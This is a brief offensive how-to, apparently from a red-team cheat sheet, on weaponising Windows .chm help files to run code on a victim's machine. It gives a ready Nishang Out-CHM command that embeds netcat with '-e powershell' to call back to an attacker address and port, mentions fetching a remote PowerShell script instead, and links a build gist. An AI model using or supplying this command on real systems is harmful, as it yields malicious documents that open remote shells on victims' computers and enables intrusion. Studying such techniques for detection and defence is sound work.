## Theory

 “Microsoft Compiled HTML Help” is a Microsoft proprietary online help format that consists of a collection of HTML pages, indexing and other navigation tools. These files are compressed and deployed in a binary format with an extension of .CHM (compiled HTML).

Check Point researcher Liad Mizrachi has conducted research showing that .chm files can be used to execute code on a victim computer running Microsoft Windows Vista, and higher.

## How to

- There are some powershell script in nishang:

1. import nishang powershell script

2. Example with netcat imported to spawn a reverse shell : `Out-CHM -Payload "C:\temp\nc.exe <ip> <port> -e powershell" -HHCPath 'C:\Program Files (x86)\HTML Help Workshop'` 
3. You can replace -Payload by -PayloadURL where you have stored a ps1 for example.


## Do it yourself

https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7